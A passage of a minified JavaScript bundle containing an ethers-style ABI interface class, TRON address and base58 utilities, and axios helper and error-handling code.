    }
    getEvent(e, t) {
        return Dt(this, Ks, Dm).call(this, e, t || null, !0)
    }
    forEachEvent(e) {
        const t = Array.from(Ae(this, $s).keys());
        t.sort( (o, i) => o.localeCompare(i));
        for (let o = 0; o < t.length; o++) {
            const i = t[o];
            e(Ae(this, $s).get(i), o)
        }
    }
    getError(e, t) {
        if (ro(e)) {
            const i = e.toLowerCase();
            if (t5[i])
                return No.from(t5[i].signature);
            for (const n of Ae(this, Ls).values())
                if (i === n.selector)
                    return n;
            return null
        }
        if (e.indexOf("(") === -1) {
            const i = [];
            for (const [n,s] of Ae(this, Ls))
                n.split("(")[0] === e && i.push(s);
            if (i.length === 0)
                return e === "Error" ? No.from("error Error(string)") : e === "Panic" ? No.from("error Panic(uint256)") : null;
            if (i.length > 1) {
                const n = i.map(s => JSON.stringify(s.format())).join(", ");
                pe(!1, `ambiguous error description (i.e. ${n})`, "name", e)
            }
            return i[0]
        }
        if (e = No.from(e).format(),
        e === "Error(string)")
            return No.from("error Error(string)");
        if (e === "Panic(uint256)")
            return No.from("error Panic(uint256)");
        const o = Ae(this, Ls).get(e);
        return o || null
    }
    forEachError(e) {
        const t = Array.from(Ae(this, Ls).keys());
        t.sort( (o, i) => o.localeCompare(i));
        for (let o = 0; o < t.length; o++) {
            const i = t[o];
            e(Ae(this, Ls).get(i), o)
        }
    }
    _decodeParams(e, t) {
        return Ae(this, Jn).decode(e, t)
    }
    _encodeParams(e, t) {
        return Ae(this, Jn).encode(e, t)
    }
    encodeDeploy(e) {
        return this._encodeParams(this.deploy.inputs, e || [])
    }
    decodeErrorResult(e, t) {
        if (typeof e == "string") {
            const o = this.getError(e);
            pe(o, "unknown error", "fragment", e),
            e = o
        }
        return pe(Ia(t, 0, 4) === e.selector, `data signature does not match error ${e.name}.`, "data", t),
        this._decodeParams(e.inputs, Ia(t, 4))
    }
    encodeErrorResult(e, t) {
        if (typeof e == "string") {
            const o = this.getError(e);
            pe(o, "unknown error", "fragment", e),
            e = o
        }
        return Ar([e.selector, this._encodeParams(e.inputs, t || [])])
    }
    decodeFunctionData(e, t) {
        if (typeof e == "string") {
            const o = this.getFunction(e);
            pe(o, "unknown function", "fragment", e),
            e = o
        }
        return pe(Ia(t, 0, 4) === e.selector, `data signature does not match function ${e.name}.`, "data", t),
        this._decodeParams(e.inputs, Ia(t, 4))
    }
    encodeFunctionData(e, t) {
        if (typeof e == "string") {
            const o = this.getFunction(e);
            pe(o, "unknown function", "fragment", e),
            e = o
        }
        return Ar([e.selector, this._encodeParams(e.inputs, t || [])])
    }
    decodeFunctionResult(e, t) {
        if (typeof e == "string") {
            const n = this.getFunction(e);
            pe(n, "unknown function", "fragment", e),
            e = n
        }
        let o = "invalid length for result data";
        const i = eo(t);
        if (i.length % 32 === 0)
            try {
                return Ae(this, Jn).decode(e.outputs, i)
            } catch {
                o = "could not decode result data"
            }
        Mt(!1, o, "BAD_DATA", {
            value: et(i),
            info: {
                method: e.name,
                signature: e.format()
            }
        })
    }
    makeError(e, t) {
        const o = pt(e, "data")
          , i = Hc.getBuiltinCallException("call", t, o);
        if (i.message.startsWith("execution reverted (unknown custom error)")) {
            const a = et(o.slice(0, 4))
              , l = this.getError(a);
            if (l)
                try {
                    const f = Ae(this, Jn).decode(l.inputs, o.slice(4));
                    i.revert = {
                        name: l.name,
                        signature: l.format(),
                        args: f
                    },
                    i.reason = i.revert.signature,
                    i.message = `execution reverted: ${i.reason}`
                } catch {
                    i.message = "execution reverted (coult not decode custom error)"
                }
        }
        const s = this.parseTransaction(t);
        return s && (i.invocation = {
            method: s.name,
            signature: s.signature,
            args: s.args
        }),
        i
    }
    encodeFunctionResult(e, t) {
        if (typeof e == "string") {
            const o = this.getFunction(e);
            pe(o, "unknown function", "fragment", e),
            e = o
        }
        return et(Ae(this, Jn).encode(e.outputs, t || []))
    }
    encodeFilterTopics(e, t) {
        if (typeof e == "string") {
            const n = this.getEvent(e);
            pe(n, "unknown event", "eventFragment", e),
            e = n
        }
        Mt(t.length <= e.inputs.length, `too many arguments for ${e.format()}`, "UNEXPECTED_ARGUMENT", {
            count: t.length,
            expectedCount: e.inputs.length
        });
        const o = [];
        e.anonymous || o.push(e.topicHash);
        const i = (n, s) => n.type === "string" ? ls(s) : n.type === "bytes" ? ir(et(s)) : (n.type === "bool" && typeof s == "boolean" && (s = s ? "0x01" : "0x00"),
        n.type.match(/^u?int/) && (s = cs(s)),
        n.type === "address" && Ae(this, Jn).encode(["address"], [s]),
        qc(et(s), 32));
        for (t.forEach( (n, s) => {
            const a = e.inputs[s];
            if (!a.indexed) {
                pe(n == null, "cannot filter non-indexed parameters; must be null", "contract." + a.name, n);
                return
            }
            n == null ? o.push(null) : a.baseType === "array" || a.baseType === "tuple" ? pe(!1, "filtering with tuples or arrays not supported", "contract." + a.name, n) : Array.isArray(n) ? o.push(n.map(l => i(a, l))) : o.push(i(a, n))
        }
        ); o.length && o[o.length - 1] === null; )
            o.pop();
        return o
    }
    encodeEventLog(e, t) {
        if (typeof e == "string") {
            const s = this.getEvent(e);
            pe(s, "unknown event", "eventFragment", e),
            e = s
        }
        const o = []
          , i = []
          , n = [];
        return e.anonymous || o.push(e.topicHash),
        pe(t.length === e.inputs.length, "event arguments/values mismatch", "values", t),
        e.inputs.forEach( (s, a) => {
            const l = t[a];
            if (s.indexed)
                if (s.type === "string")
                    o.push(ls(l));
                else if (s.type === "bytes")
                    o.push(ir(l));
                else {
                    if (s.baseType === "tuple" || s.baseType === "array")
                        throw new Error("not implemented");
                    o.push(Ae(this, Jn).encode([s.type], [l]))
                }
            else
                i.push(s),
                n.push(l)
        }
        ),
        {
            data: Ae(this, Jn).encode(i, n),
            topics: o
        }
    }
    decodeEventLog(e, t, o) {
        if (typeof e == "string") {
            const v = this.getEvent(e);
            pe(v, "unknown event", "eventFragment", e),
            e = v
        }
        if (o != null && !e.anonymous) {
            const v = e.topicHash;
            pe(ro(o[0], 32) && o[0].toLowerCase() === v, "fragment/topic mismatch", "topics[0]", o[0]),
            o = o.slice(1)
        }
        const i = []
          , n = []
          , s = [];
        e.inputs.forEach( (v, T) => {
            v.indexed ? v.type === "string" || v.type === "bytes" || v.baseType === "tuple" || v.baseType === "array" ? (i.push(ko.from({
                type: "bytes32",
                name: v.name
            })),
            s.push(!0)) : (i.push(v),
            s.push(!1)) : (n.push(v),
            s.push(!1))
        }
        );
        const a = o != null ? Ae(this, Jn).decode(i, Ar(o)) : null
          , l = Ae(this, Jn).decode(n, t, !0)
          , f = []
          , h = [];
        let p = 0
          , b = 0;
        return e.inputs.forEach( (v, T) => {
            let x = null;
            if (v.indexed)
                if (a == null)
                    x = new QR(null);
                else if (s[T])
                    x = new QR(a[b++]);
                else
                    try {
                        x = a[b++]
                    } catch (E) {
                        x = E
                    }
            else
                try {
                    x = l[p++]
                } catch (E) {
                    x = E
                }
            f.push(x),
            h.push(v.name || null)
        }
        ),
        Wd.fromItems(f, h)
    }
    parseTransaction(e) {
        const t = pt(e.data, "tx.data")
          , o = Er(e.value != null ? e.value : 0, "tx.value")
          , i = this.getFunction(et(t.slice(0, 4)));
        if (!i)
            return null;
        const n = Ae(this, Jn).decode(i.inputs, t.slice(4));
        return new cpe(i,i.selector,n,o)
    }
    parseCallResult(e) {
        throw new Error("@TODO")
    }
    parseLog(e) {
        const t = this.getEvent(e.topics[0]);
        return !t || t.anonymous ? null : new ape(t,t.topicHash,this.decodeEventLog(t, e.data, e.topics))
    }
    parseError(e) {
        const t = et(e)
          , o = this.getError(Ia(t, 0, 4));
        if (!o)
            return null;
        const i = Ae(this, Jn).decode(o.inputs, Ia(t, 4));
        return new lpe(o,o.selector,i)
    }
    static from(e) {
        return e instanceof Kf ? e : typeof e == "string" ? new Kf(JSON.parse(e)) : typeof e.format == "function" ? new Kf(e.format("json")) : new Kf(e)
    }
}
;
Ls = new WeakMap,
$s = new WeakMap,
zs = new WeakMap,
Jn = new WeakMap,
Ks = new WeakSet,
Nm = function(e, t, o) {
    if (ro(e)) {
        const n = e.toLowerCase();
        for (const s of Ae(this, zs).values())
            if (n === s.selector)
                return s;
        return null
    }
    if (e.indexOf("(") === -1) {
        const n = [];
        for (const [s,a] of Ae(this, zs))
            s.split("(")[0] === e && n.push(a);
        if (t) {
            const s = t.length > 0 ? t[t.length - 1] : null;
            let a = t.length
              , l = !0;
            Uo.isTyped(s) && s.type === "overrides" && (l = !1,
            a--);
            for (let f = n.length - 1; f >= 0; f--) {
                const h = n[f].inputs.length;
                h !== a && (!l || h !== a - 1) && n.splice(f, 1)
            }
            for (let f = n.length - 1; f >= 0; f--) {
                const h = n[f].inputs;
                for (let p = 0; p < t.length; p++)
                    if (Uo.isTyped(t[p])) {
                        if (p >= h.length) {
                            if (t[p].type === "overrides")
                                continue;
                            n.splice(f, 1);
                            break
                        }
                        if (t[p].type !== h[p].baseType) {
                            n.splice(f, 1);
                            break
                        }
                    }
            }
        }
        if (n.length === 1 && t && t.length !== n[0].inputs.length) {
            const s = t[t.length - 1];
            (s == null || Array.isArray(s) || typeof s != "object") && n.splice(0, 1)
        }
        if (n.length === 0)
            return null;
        if (n.length > 1 && o) {
            const s = n.map(a => JSON.stringify(a.format())).join(", ");
            pe(!1, `ambiguous function description (i.e. matches ${s})`, "key", e)
        }
        return n[0]
    }
    const i = Ae(this, zs).get(Vs.from(e).format());
    return i || null
}
,
Dm = function(e, t, o) {
    if (ro(e)) {
        const n = e.toLowerCase();
        for (const s of Ae(this, $s).values())
            if (n === s.topicHash)
                return s;
        return null
    }
    if (e.indexOf("(") === -1) {
        const n = [];
        for (const [s,a] of Ae(this, $s))
            s.split("(")[0] === e && n.push(a);
        if (t) {
            for (let s = n.length - 1; s >= 0; s--)
                n[s].inputs.length < t.length && n.splice(s, 1);
            for (let s = n.length - 1; s >= 0; s--) {
                const a = n[s].inputs;
                for (let l = 0; l < t.length; l++)
                    if (Uo.isTyped(t[l]) && t[l].type !== a[l].baseType) {
                        n.splice(s, 1);
                        break
                    }
            }
        }
        if (n.length === 0)
            return null;
        if (n.length > 1 && o) {
            const s = n.map(a => JSON.stringify(a.format())).join(", ");
            pe(!1, `ambiguous event description (i.e. matches ${s})`, "key", e)
        }
        return n[0]
    }
    const i = Ae(this, $s).get(qs.from(e).format());
    return i || null
}
;
let _A = Kf;
const upe = r => mo.from(r)
  , NF = r => mo.from(r).serialized
  , DF = r => pt(r)
  , fpe = {
    sighash: "sighash",
    minimal: "minimal",
    full: "full",
    json: "json"
}
  , dpe = Kc.isValidMnemonic;
Vc.register( (r, e, t) => Vc._(r, Buffer.from(e), Buffer.from(t)));
const hpe = Object.freeze(Object.defineProperty({
    __proto__: null,
    AbiCoder: Hc,
    FormatTypes: fpe,
    Interface: _A,
    Mnemonic: Kc,
    Signature: mo,
    SigningKey: li,
    Wordlist: wF,
    arrayify: DF,
    concat: Ar,
    ethersHDNodeWallet: Xp,
    id: ls,
    isValidMnemonic: dpe,
    joinSignature: NF,
    keccak256: ir,
    recoverAddress: kd,
    sha256: no,
    splitSignature: upe,
    toUtf8Bytes: Fo,
    toUtf8String: n7,
    wordlists: Yhe
}, Symbol.toStringTag, {
    value: "Module"
}))
  , FF = 34
  , $i = "41"
  , UF = 65
  , Ld = /^(41)/
  , kF = "m/44'/195'"
  , h4 = kF + "/0'/0/0";
function LF(r) {
    return Ou(r) ? rl(bo(r.replace(/^0x/, $i))) : r
}
function gt(r) {
    return Ou(r) ? r.toLowerCase().replace(/^0x/, $i) : mr(QU(r)).toLowerCase()
}
function ppe(r) {
    r = r.toLowerCase();
    const e = r.substring(2).split("")
      , t = new Uint8Array(40);
    for (let i = 0; i < 40; i++)
        t[i] = e[i].charCodeAt(0);
    const o = bo(ir(t).slice(2));
    for (let i = 0; i < 40; i += 2)
        o[i >> 1] >> 4 >= 8 && (e[i] = e[i].toUpperCase()),
        (o[i >> 1] & 15) >= 8 && (e[i + 1] = e[i + 1].toUpperCase());
    return $i + e.join("")
}
function p4(r) {
    if (!M0(r))
        throw new Error(`'${r}' is not a valid address string`);
    return ppe(gt(r))
}
function $F(r) {
    if (!Ou(r) || r.length !== 42)
        return !1;
    try {
        return p4(r) === r
    } catch {
        return !1
    }
}
function zF(r, e=!1) {
    try {
        return vx(r, e)
    } catch {
        return !1
    }
}
function M0(r) {
    if (!r || !fo(r))
        return !1;
    if (r.length === 42)
        try {
            return M0(rl(bo(r)))
        } catch {
            return !1
        }
    try {
        return tk(r)
    } catch {
        return !1
    }
}
const gpe = Object.freeze(Object.defineProperty({
    __proto__: null,
    ADDRESS_PREFIX: $i,
    ADDRESS_PREFIX_BYTE: UF,
    ADDRESS_PREFIX_REGEX: Ld,
    ADDRESS_SIZE: FF,
    TRON_BIP39_PATH_INDEX_0: h4,
    TRON_BIP39_PATH_PREFIX: kF,
    fromHex: LF,
    fromPrivateKey: zF,
    isAddress: M0,
    isChecksumAddress: $F,
    toChecksumAddress: p4,
    toHex: gt
}, Symbol.toStringTag, {
    value: "Module"
}))
  , IA = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
  , OA = {};
for (let r = 0; r < IA.length; r++)
    OA[IA.charAt(r)] = r;
const Op = 58;
function jF(r) {
    if (r.length === 0)
        return "";
    let e, t;
    const o = [0];
    for (e = 0; e < r.length; e++) {
        for (t = 0; t < o.length; t++)
            o[t] <<= 8;
        o[0] += r[e];
        let i = 0;
        for (t = 0; t < o.length; ++t)
            o[t] += i,
            i = o[t] / Op | 0,
            o[t] %= Op;
        for (; i; )
            o.push(i % Op),
            i = i / Op | 0
    }
    for (e = 0; r[e] === 0 && e < r.length - 1; e++)
        o.push(0);
    return o.reverse().map(i => IA[i]).join("")
}
function nx(r) {
    if (r.length === 0)
        return [];
    let e, t;
    const o = [0];
    for (e = 0; e < r.length; e++) {
        const i = r[e];
        if (!(i in OA))
            throw new Error("Non-base58 character");
        for (t = 0; t < o.length; t++)
            o[t] *= Op;
        o[0] += OA[i];
        let n = 0;
        for (t = 0; t < o.length; ++t)
            o[t] += n,
            n = o[t] >> 8,
            o[t] &= 255;
        for (; n; )
            o.push(n & 255),
            n >>= 8
    }
    for (e = 0; r[e] === "1" && e < r.length - 1; e++)
        o.push(0);
    return o.reverse()
}
const ype = Object.freeze(Object.defineProperty({
    __proto__: null,
    decode58: nx,
    encode58: jF
}, Symbol.toStringTag, {
    value: "Module"
}));
function qF(r, e) {
    return function() {
        return r.apply(e, arguments)
    }
}
const {toString: bpe} = Object.prototype
  , {getPrototypeOf: g4} = Object
  , ox = (r => e => {
    const t = bpe.call(e);
    return r[t] || (r[t] = t.slice(8, -1).toLowerCase())
}
)(Object.create(null))
  , hs = r => (r = r.toLowerCase(),
e => ox(e) === r)
  , ix = r => e => typeof e === r
  , {isArray: nh} = Array
  , e0 = ix("undefined");
function mpe(r) {
    return r !== null && !e0(r) && r.constructor !== null && !e0(r.constructor) && ui(r.constructor.isBuffer) && r.constructor.isBuffer(r)
}
const VF = hs("ArrayBuffer");
function xpe(r) {
    let e;
    return typeof ArrayBuffer < "u" && ArrayBuffer.isView ? e = ArrayBuffer.isView(r) : e = r && r.buffer && VF(r.buffer),
    e
}
const wpe = ix("string")
  , ui = ix("function")
  , HF = ix("number")
  , sx = r => r !== null && typeof r == "object"
  , vpe = r => r === !0 || r === !1
  , Fm = r => {
    if (ox(r) !== "object")
        return !1;
    const e = g4(r);
    return (e === null || e === Object.prototype || Object.getPrototypeOf(e) === null) && !(Symbol.toStringTag in r) && !(Symbol.iterator in r)
}
  , Tpe = hs("Date")
  , Epe = hs("File")
  , Ape = hs("Blob")
  , Ppe = hs("FileList")
  , Cpe = r => sx(r) && ui(r.pipe)
  , Spe = r => {
    let e;
    return r && (typeof FormData == "function" && r instanceof FormData || ui(r.append) && ((e = ox(r)) === "formdata" || e === "object" && ui(r.toString) && r.toString() === "[object FormData]"))
}
  , Bpe = hs("URLSearchParams")
  , [_pe,Ipe,Ope,Rpe] = ["ReadableStream", "Request", "Response", "Headers"].map(hs)
  , Wpe = r => r.trim ? r.trim() : r.replace(/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g, "");
function N0(r, e, {allOwnKeys: t=!1}={}) {
    if (r === null || typeof r > "u")
        return;
    let o, i;
    if (typeof r != "object" && (r = [r]),
    nh(r))
        for (o = 0,
        i = r.length; o < i; o++)
            e.call(null, r[o], o, r);
    else {
        const n = t ? Object.getOwnPropertyNames(r) : Object.keys(r)
          , s = n.length;
        let a;
        for (o = 0; o < s; o++)
            a = n[o],
            e.call(null, r[a], a, r)
    }
}
function GF(r, e) {
    e = e.toLowerCase();
    const t = Object.keys(r);
    let o = t.length, i;
    for (; o-- > 0; )
        if (i = t[o],
        e === i.toLowerCase())
            return i;
    return null
}
const Vl = typeof globalThis < "u" ? globalThis : typeof self < "u" ? self : typeof window < "u" ? window : global
  , KF = r => !e0(r) && r !== Vl;
function RA() {
    const {caseless: r} = KF(this) && this || {}
      , e = {}
      , t = (o, i) => {
        const n = r && GF(e, i) || i;
        Fm(e[n]) && Fm(o) ? e[n] = RA(e[n], o) : Fm(o) ? e[n] = RA({}, o) : nh(o) ? e[n] = o.slice() : e[n] = o
    }
    ;
    for (let o = 0, i = arguments.length; o < i; o++)
        arguments[o] && N0(arguments[o], t);
    return e
}
const Mpe = (r, e, t, {allOwnKeys: o}={}) => (N0(e, (i, n) => {
    t && ui(i) ? r[n] = qF(i, t) : r[n] = i
}
, {
    allOwnKeys: o
}),
r)
  , Npe = r => (r.charCodeAt(0) === 65279 && (r = r.slice(1)),
r)
  , Dpe = (r, e, t, o) => {
    r.prototype = Object.create(e.prototype, o),
    r.prototype.constructor = r,
    Object.defineProperty(r, "super", {
        value: e.prototype
    }),
    t && Object.assign(r.prototype, t)
}
  , Fpe = (r, e, t, o) => {
    let i, n, s;
    const a = {};
    if (e = e || {},
    r == null)
        return e;
    do {
        for (i = Object.getOwnPropertyNames(r),
        n = i.length; n-- > 0; )
            s = i[n],
            (!o || o(s, r, e)) && !a[s] && (e[s] = r[s],
            a[s] = !0);
        r = t !== !1 && g4(r)
    } while (r && (!t || t(r, e)) && r !== Object.prototype);
    return e
}
  , Upe = (r, e, t) => {
    r = String(r),
    (t === void 0 || t > r.length) && (t = r.length),
    t -= e.length;
    const o = r.indexOf(e, t);
    return o !== -1 && o === t
}
  , kpe = r => {
    if (!r)
        return null;
    if (nh(r))
        return r;
    let e = r.length;
    if (!HF(e))
        return null;
    const t = new Array(e);
    for (; e-- > 0; )
        t[e] = r[e];
    return t
}
  , Lpe = (r => e => r && e instanceof r)(typeof Uint8Array < "u" && g4(Uint8Array))
  , $pe = (r, e) => {
    const o = (r && r[Symbol.iterator]).call(r);
    let i;
    for (; (i = o.next()) && !i.done; ) {
        const n = i.value;
        e.call(r, n[0], n[1])
    }
}
  , zpe = (r, e) => {
    let t;
    const o = [];
    for (; (t = r.exec(e)) !== null; )
        o.push(t);
    return o
}
  , jpe = hs("HTMLFormElement")
  , qpe = r => r.toLowerCase().replace(/[-_\s]([a-z\d])(\w*)/g, function(t, o, i) {
    return o.toUpperCase() + i
})
  , r5 = ( ({hasOwnProperty: r}) => (e, t) => r.call(e, t))(Object.prototype)
  , Vpe = hs("RegExp")
  , ZF = (r, e) => {
    const t = Object.getOwnPropertyDescriptors(r)
      , o = {};
    N0(t, (i, n) => {
        let s;
        (s = e(i, n, r)) !== !1 && (o[n] = s || i)
    }
    ),
    Object.defineProperties(r, o)
}
  , Hpe = r => {
    ZF(r, (e, t) => {
        if (ui(r) && ["arguments", "caller", "callee"].indexOf(t) !== -1)
            return !1;
        const o = r[t];
        if (ui(o)) {
            if (e.enumerable = !1,
            "writable"in e) {
                e.writable = !1;
                return
            }
            e.set || (e.set = () => {
                throw Error("Can not rewrite read-only method '" + t + "'")
            }
            )
        }
    }
    )
}
  , Gpe = (r, e) => {
    const t = {}
      , o = i => {
        i.forEach(n => {
            t[n] = !0
        }
        )
    }
    ;
    return nh(r) ? o(r) : o(String(r).split(e)),
    t
}
  , Kpe = () => {}
  , Zpe = (r, e) => r != null && Number.isFinite(r = +r) ? r : e;
function Ype(r) {
    return !!(r && ui(r.append) && r[Symbol.toStringTag] === "FormData" && r[Symbol.iterator])
}
const Xpe = r => {
    const e = new Array(10)
      , t = (o, i) => {
        if (sx(o)) {
            if (e.indexOf(o) >= 0)
                return;
            if (!("toJSON"in o)) {
                e[i] = o;
                const n = nh(o) ? [] : {};
                return N0(o, (s, a) => {
                    const l = t(s, i + 1);
                    !e0(l) && (n[a] = l)
                }
                ),
                e[i] = void 0,
                n
            }
        }
        return o
    }
    ;
    return t(r, 0)
}
  , Jpe = hs("AsyncFunction")
  , Qpe = r => r && (sx(r) || ui(r)) && ui(r.then) && ui(r.catch)
  , YF = ( (r, e) => r ? setImmediate : e ? ( (t, o) => (Vl.addEventListener("message", ({source: i, data: n}) => {
    i === Vl && n === t && o.length && o.shift()()
}
, !1),
i => {
    o.push(i),
    Vl.postMessage(t, "*")
}
))(`axios@${Math.random()}`, []) : t => setTimeout(t))(typeof setImmediate == "function", ui(Vl.postMessage))
  , e0e = typeof queueMicrotask < "u" ? queueMicrotask.bind(Vl) : typeof process < "u" && process.nextTick || YF
  , Oe = {
    isArray: nh,
    isArrayBuffer: VF,
    isBuffer: mpe,
    isFormData: Spe,
    isArrayBufferView: xpe,
    isString: wpe,
    isNumber: HF,
    isBoolean: vpe,
    isObject: sx,
    isPlainObject: Fm,
    isReadableStream: _pe,
    isRequest: Ipe,
    isResponse: Ope,
    isHeaders: Rpe,
    isUndefined: e0,
    isDate: Tpe,
    isFile: Epe,
    isBlob: Ape,
    isRegExp: Vpe,
    isFunction: ui,
    isStream: Cpe,
    isURLSearchParams: Bpe,
    isTypedArray: Lpe,
    isFileList: Ppe,
    forEach: N0,
    merge: RA,
    extend: Mpe,
    trim: Wpe,
    stripBOM: Npe,
    inherits: Dpe,
    toFlatObject: Fpe,
    kindOf: ox,
    kindOfTest: hs,
    endsWith: Upe,
    toArray: kpe,
    forEachEntry: $pe,
    matchAll: zpe,
    isHTMLForm: jpe,
    hasOwnProperty: r5,
    hasOwnProp: r5,
    reduceDescriptors: ZF,
    freezeMethods: Hpe,
    toObjectSet: Gpe,
    toCamelCase: qpe,
    noop: Kpe,
    toFiniteNumber: Zpe,
    findKey: GF,
    global: Vl,
    isContextDefined: KF,
    isSpecCompliantForm: Ype,
    toJSONObject: Xpe,
    isAsyncFn: Jpe,
    isThenable: Qpe,
    setImmediate: YF,
    asap: e0e
};
function Ut(r, e, t, o, i) {
    Error.call(this),
    Error.captureStackTrace ? Error.captureStackTrace(this, this.constructor) : this.stack = new Error().stack,
    this.message = r,
    this.name = "AxiosError",
    e && (this.code = e),
    t && (this.config = t),
    o && (this.request = o),
    i && (this.response = i,
    this.status = i.status ? i.status : null)
}
Oe.inherits(Ut, Error, {
    toJSON: function() {
        return {
            message: this.message,
            name: this.name,
            description: this.description,
            number: this.number,
            fileName: this.fileName,
            lineNumber: this.lineNumber,
            columnNumber: this.columnNumber,
            stack: this.stack,
            config: Oe.toJSONObject(this.config),
            code: this.code,
            status: this.status
        }
    }
});
const XF = Ut.prototype
  , JF = {};
["ERR_BAD_OPTION_VALUE", "ERR_BAD_OPTION", "ECONNABORTED", "ETIMEDOUT", "ERR_NETWORK", "ERR_FR_TOO_MANY_REDIRECTS", "ERR_DEPRECATED", "ERR_BAD_RESPONSE", "ERR_BAD_REQUEST", "ERR_CANCELED", "ERR_NOT_SUPPORT", "ERR_INVALID_URL"].forEach(r => {
    JF[r] = {
        value: r
    }
}
);
Object.defineProperties(Ut, JF);
Object.defineProperty(XF, "isAxiosError", {
    value: !0
});
Ut.from = (r, e, t, o, i, n) => {
    const s = Object.create(XF);
    return Oe.toFlatObject(r, s, function(l) {
        return l !== Error.prototype
    }, a => a !== "isAxiosError"),
    Ut.call(s, r.message, e, t, o, i),
    s.cause = r,
    s.name = r.name,
    n && Object.assign(s, n),
    s
}
;
const t0e = null;
function WA(r) {
    return Oe.isPlainObject(r) || Oe.isArray(r)
}
function QF(r) {
    return Oe.endsWith(r, "[]") ? r.slice(0, -2) : r
}
function n5(r, e, t) {
    return r ? r.concat(e).map(function(i, n) {
        return i = QF(i),
        !t && n ? "[" + i + "]" : i
    }).join(t ? "." : "") : e
}
function r0e(r) {
    return Oe.isArray(r) && !r.some(WA)
}
const n0e = Oe.toFlatObject(Oe, {}, null, function(e) {
    return /^is[A-Z]/.test(e)
});
function ax(r, e, t) {
    if (!Oe.isObject(r))
        throw new TypeError("target must be an object");
    e = e || new FormData,
    t = Oe.toFlatObject(t, {
        metaTokens: !0,
        dots: !1,
        indexes: !1
    }, !1, function(x, E) {
        return !Oe.isUndefined(E[x])
    });
    const o = t.metaTokens
      , i = t.visitor || h
      , n = t.dots
      , s = t.indexes
      , l = (t.Blob || typeof Blob < "u" && Blob) && Oe.isSpecCompliantForm(e);
    if (!Oe.isFunction(i))
        throw new TypeError("visitor must be a function");
    function f(T) {
        if (T === null)
            return "";
        if (Oe.isDate(T))
            return T.toISOString();
        if (!l && Oe.isBlob(T))
            throw new Ut("Blob is not supported. Use a Buffer instead.");
        return Oe.isArrayBuffer(T) || Oe.isTypedArray(T) ? l && typeof Blob == "function" ? new Blob([T]) : Buffer.from(T) : T
    }
    function h(T, x, E) {
        let B = T;
        if (T && !E && typeof T == "object") {
            if (Oe.endsWith(x, "{}"))
                x = o ? x : x.slice(0, -2),
                T = JSON.stringify(T);
            else if (Oe.isArray(T) && r0e(T) || (Oe.isFileList(T) || Oe.endsWith(x, "[]")) && (B = Oe.toArray(T)))
                return x = QF(x),
                B.forEach(function(O, F) {
                    !(Oe.isUndefined(O) || O === null) && e.append(s === !0 ? n5([x], F, n) : s === null ? x : x + "[]", f(O))
                }),
                !1
        }
        return WA(T) ? !0 : (e.append(n5(E, x, n), f(T)),
        !1)
    }
    const p = []
      , b = Object.assign(n0e, {
        defaultVisitor: h,
        convertValue: f,
        isVisitable: WA
    });
    function v(T, x) {
        if (!Oe.isUndefined(T)) {
            if (p.indexOf(T) !== -1)
                throw Error("Circular reference detected in " + x.join("."));
            p.push(T),
            Oe.forEach(T, function(B, P) {
                (!(Oe.isUndefined(B) || B === null) && i.call(e, B, Oe.isString(P) ? P.trim() : P, x, b)) === !0 && v(B, x ? x.concat(P) : [P])
            }),
            p.pop()
        }
    }
    if (!Oe.isObject(r))
        throw new TypeError("data must be an object");
    return v(r),
    e
}
function o5(r) {
    const e = {
        "!": "%21",
        "'": "%27",
        "(": "%28",
        ")": "%29",
        "~": "%7E",
        "%20": "+",
        "%00": "\0"
    };
    return encodeURIComponent(r).replace(/[!'()~]|%20|%00/g, function(o) {
        return e[o]
    })
}
function y4(r, e) {
    this._pairs = [],
    r && ax(r, this, e)
}
const eU = y4.prototype;
eU.append = function(e, t) {
    this._pairs.push([e, t])
}
;
eU.toString = function(e) {
    const t = e ? function(o) {
        return e.call(this, o, o5)
    }
    : o5;
    return this._pairs.map(function(i) {
        return t(i[0]) + "=" + t(i[1])
    }, "").join("&")
}
;
function o0e(r) {
    return encodeURIComponent(r).replace(/%3A/gi, ":").replace(/%24/g, "$").replace(/%2C/gi, ",").replace(/%20/g, "+").replace(/%5B/gi, "[").replace(/%5D/gi, "]")
}
function tU(r, e, t) {
    if (!e)
        return r;
    const o = t && t.encode || o0e;
    Oe.isFunction(t) && (t = {
        serialize: t
    });
    const i = t && t.serialize;
    let n;
    if (i ? n = i(e, t) : n = Oe.isURLSearchParams(e) ? e.toString() : new y4(e,t).toString(o),
    n) {
        const s = r.indexOf("#");
        s !== -1 && (r = r.slice(0, s)),
        r += (r.indexOf("?") === -1 ? "?" : "&") + n
    }
    return r
}
class i5 {
    constructor() {
        this.handlers = []
    }
    use(e, t, o) {
        return this.handlers.push({
            fulfilled: e,
            rejected: t,
            synchronous: o ? o.synchronous : !1,
            runWhen: o ? o.runWhen : null
        }),
        this.handlers.length - 1
    }
    eject(e) {
        this.handlers[e] && (this.handlers[e] = null)
    }
    clear() {
        this.handlers && (this.handlers = [])
    }
    forEach(e) {
        Oe.forEach(this.handlers, function(o) {
            o !== null && e(o)
        })
    }
}
const rU = {
    silentJSONParsing: !0,
    forcedJSONParsing: !0,
    clarifyTimeoutError: !1
}
  , i0e = typeof URLSearchParams < "u" ? URLSearchParams : y4
  , s0e = typeof FormData < "u" ? FormData : null
  , a0e = typeof Blob < "u" ? Blob : null
  , c0e = {
    isBrowser: !0,
    classes: {
        URLSearchParams: i0e,
        FormData: s0e,
        Blob: a0e
    },
    protocols: ["http", "https", "file", "blob", "url", "data"]
}
  , b4 = typeof window < "u" && typeof document < "u"
  , MA = typeof navigator == "object" && navigator || void 0
  , l0e = b4 && (!MA || ["ReactNative", "NativeScript", "NS"].indexOf(MA.product) < 0)
  , u0e = typeof WorkerGlobalScope < "u" && self instanceof WorkerGlobalScope && typeof self.importScripts == "function"
  , f0e = b4 && window.location.href || "http://localhost"
  , d0e = Object.freeze(Object.defineProperty({
    __proto__: null,
    hasBrowserEnv: b4,
    hasStandardBrowserEnv: l0e,
    hasStandardBrowserWebWorkerEnv: u0e,
    navigator: MA,
    origin: f0e
}, Symbol.toStringTag, {
    value: "Module"
}))
  , to = {
    ...d0e,
    ...c0e
};
function h0e(r, e) {
    return ax(r, new to.classes.URLSearchParams, Object.assign({
        visitor: function(t, o, i, n) {
            return to.isNode && Oe.isBuffer(t) ? (this.append(o, t.toString("base64")),
            !1) : n.defaultVisitor.apply(this, arguments)
        }
    }, e))
}
function p0e(r) {
    return Oe.matchAll(/\w+|\[(\w*)]/g, r).map(e => e[0] === "[]" ? "" : e[1] || e[0])
}
